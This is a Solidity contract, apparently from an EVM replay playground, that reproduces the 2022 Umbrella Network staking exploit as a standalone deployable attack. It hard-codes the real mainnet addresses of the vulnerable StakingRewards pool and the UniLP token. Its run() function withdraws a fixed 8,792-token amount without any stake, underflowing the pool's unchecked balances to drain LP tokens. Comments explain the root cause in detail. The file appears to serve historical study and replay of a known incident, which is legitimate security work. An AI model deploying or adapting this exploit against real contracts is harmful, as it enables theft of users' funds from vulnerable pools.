// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-03-Umbrella).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (AttackContract is Test; testExploit() calls StakingRewards.withdraw() directly
// with no separate exploit contract), so there is nothing standalone to deploy.
// This contract is a faithful, self-contained copy of that inline attack so the
// playground can deploy it and record run(). Logic and constants are copied
// verbatim from test/Umbrella_exp.sol.
//
// Root cause: StakingRewards (compiled with solc 0.7.5, no SafeMath) computes
//   _totalSupply = _totalSupply - amount;
//   _balances[user] = _balances[user] - amount;
// in _withdraw WITHOUT checking that the caller has staked `amount`. An un-staked
// caller withdrawing more than its (zero) stake UNDERFLOWS both accounting slots to
// huge values, and the subsequent stakingToken.transfer(recipient, amount) hands
// the caller real LP tokens straight out of the pool. The attacker drains 8,792
// UniLP tokens having staked nothing.

interface IStakingRewards {
    function withdraw(uint256 amount) external;
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

contract UmbrellaDrain {
    // Vulnerable StakingRewards pool (Umbrella Network reward/staking contract,
    // Ethereum mainnet, solc 0.7.5 — pre-0.8 unchecked arithmetic).
    IStakingRewards constant StakingRewards = IStakingRewards(0xB3FB1D01B07A706736Ca175f827e4F56021b85dE);
    IERC20 constant uniLP = IERC20(0xB1BbeEa2dA2905E6B0A30203aEf55c399C53D042);

    // The exact amount the historical attacker withdrew: 8,792.873290680252648282
    // UniLP tokens. Withdrawing this (with a zero stake) underflows _totalSupply and
    // _balances[msg.sender], and the pool transfers that many LP tokens here.
    uint256 constant DRAIN_AMOUNT = 8_792_873_290_680_252_648_282;

    function run() external {
        // No stake, no deposit — just withdraw more than our (zero) balance. On the
        // pre-0.8 contract the unchecked subtraction wraps, the require(amount != 0)
        // passes, and safeTransfer sends real LP tokens to this contract.
        StakingRewards.withdraw(DRAIN_AMOUNT);
    }
}
